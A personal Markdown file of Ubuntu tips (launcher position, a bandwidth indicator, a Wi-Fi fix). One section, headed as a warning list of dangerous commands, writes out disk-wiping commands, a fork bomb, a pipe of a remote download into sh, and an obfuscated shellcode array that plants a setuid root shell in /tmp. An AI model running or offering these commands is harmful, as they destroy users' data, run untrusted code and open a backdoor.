# Linux Stuff

## Move Unity Launcher (Icon Bar)

```gsettings set com.canonical.Unity.Launcher launcher-position Bottom```

```gsettings set com.canonical.Unity.Launcher launcher-position Left```

## Bandwidth Monitor (Indicator Netspeed - Unity)

```sudo apt-get install dconf-editor```

```sudo apt-add-repository ppa:fixnix/netspeed```

```sudo apt-get update```

```sudo apt-get install indicator-netspeed-unity```

## Most Dangerous Commands For Ubuntu

```rm command in Linux is used to delete files.```

```rm -r command deletes the folder recursively, even the empty folder.```

```rm -f command removes ‘Read only File’ without asking.```

```rm -rf / : Force deletion of everything in root directory.```

```rm -rf * : Force deletion of everything in current directory/working directory.```

```rm -rf . : Force deletion of current folder and sub folders.```

```:(){:|:&};:```

```mv /home/user/* /dev/null```

```wget http://malicious_source -O- | sh```

```mkfs.ext3 /dev/sda```

```dd if=/dev/random of=/dev/sda```

```char esp[] __attribute__ ((section(“.text”))) /* e.s.p
release */
= “\xeb\x3e\x5b\x31\xc0\x50\x54\x5a\x83\xec\x64\x68″
“\xff\xff\xff\xff\x68\xdf\xd0\xdf\xd9\x68\x8d\x99″
“\xdf\x81\x68\x8d\x92\xdf\xd2\x54\x5e\xf7\x16\xf7″
“\x56\x04\xf7\x56\x08\xf7\x56\x0c\x83\xc4\x74\x56″
“\x8d\x73\x08\x56\x53\x54\x59\xb0\x0b\xcd\x80\x31″
“\xc0\x40\xeb\xf9\xe8\xbd\xff\xff\xff\x2f\x62\x69″
“\x6e\x2f\x73\x68\x00\x2d\x63\x00″
“cp -p /bin/sh /tmp/.beyond; chmod 4755
/tmp/.beyond;”;```

## Ubuntu 17.04
### If Wifi is not connecting

####Edit the file /etc/NetworkManager/NetworkManager.conf

```sudo su```

```pico /etc/NetworkManager/NetworkManager.conf```

####Add the following code at the end of this file

```[device]
wifi.scan-rand-mac-address=no```

####After saving simply restart the network

```sudo service network-manager restart```
